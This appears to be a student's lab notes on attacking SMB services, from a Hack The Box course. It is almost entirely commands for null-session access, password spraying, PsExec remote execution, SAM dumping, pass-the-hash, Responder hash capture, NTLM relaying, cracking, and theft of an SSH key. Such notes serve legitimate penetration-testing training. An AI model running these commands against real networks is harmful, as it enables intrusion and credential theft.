...
- `smbclient` - Interact with SMB service
...
## Enumeration
Depending on SMB implementation/OS, `nmap` will return different information. When targeting Windows OS, version information is usually not inculded as part of the NMAP scan results. Nmap will try to guess the OS version. However, we often need other scans to identify if the target is vulnerable to a particulat exploit. For now, let's scan ports `139` and `445` TCP.

```shell
gdxqpardo@htb[/htb]$ sudo nmap 10.129.14.128 -sV -sC -p139,445
...
### Misconfigurations
SMB can be configured not to require authentication, which is also called a `null session`. Instead we can log in with no username/password
...
```shell-session
gdxqpardo@htb[/htb]$ smbclient -N -L //10.129.14.128
...
```shell
gdxqpardo@htb[/htb]$ smbmap -H 10.129.14.128
...
```shell
gdxqpardo@htb[/htb]$ smbmap -H 10.129.14.128 -r notes
...
```shell
gdxqpardo@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"
...
```shell
gdxqpardo@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
...
`rpcclient` tool offers us many different commands to execute specific functions on the SMB server to gather information or modify server attributes like a username. 
...
```shell-session
gdxqpardo@htb[/htb]$ rpcclient -U'%' 10.10.110.17
...
```shell
gdxqpardo@htb[/htb]$ ./enum4linux-ng.py 10.10.11.45 -A -C
...
```shell
gdxqpardo@htb[/htb]$ cat /tmp/userlist.txt
...
```shell
gdxqpardo@htb[/htb]$ crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth
...
#### SMB
Linux/Windows SMB servers are different attack paths. Usually only access to the file system, privileges, or known vulnerable exploit's in a linux environment. In windows, the attack surface is more significant.
...
`PsExec` is a tool that lets us execute processes on other systems, complete with full interactivity for console applications, without having to install client software manually. It works because ity has a windows service image inside of it executable.
...
```shell
gdxqpardo@htb[/htb]$ impacket-psexec -h
...
```shell
gdxqpardo@htb[/htb]$ impacket-psexec administrator:'Password123!'@10.10.110.17
...
```shell
gdxqpardo@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
...
Imagine we are in a network with multiple machines. Some of them share the same local administrator account. 

In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.

```shell
gdxqpardo@htb[/htb]$ crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
...
```shell
gdxqpardo@htb[/htb]$ crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
...
```shell
gdxqpardo@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
...
**SMB** can also be abused by creating a fake SMB Server to capture the users' [NetNTLM v1/v2 hashes](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4).
...
```shell
gdxqpardo@htb[/htb]$ responder -I <interface name>
```

When a user tries to perform a Name Resolution (NR) request, a series of procedures are conducted by a machine to retrieve a host's IP address by its hostname. On Windows, this goes as follow:
...
```shell
gdxqpardo@htb[/htb]$ sudo responder -I ens33
...
```shell
gdxqpardo@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
...
```shell-session
gdxqpardo@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='
...
```shell-session
gdxqpardo@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
...
```shell-session
gdxqpardo@htb[/htb]$ nc -lvnp 9001
...
> `smbclient \\\\$IP\\GGJ -U 'jason%password'`
> > `get id_rsa`
> > `chmod 600 id_rsa && ssh jason@$IP -i id_rsa`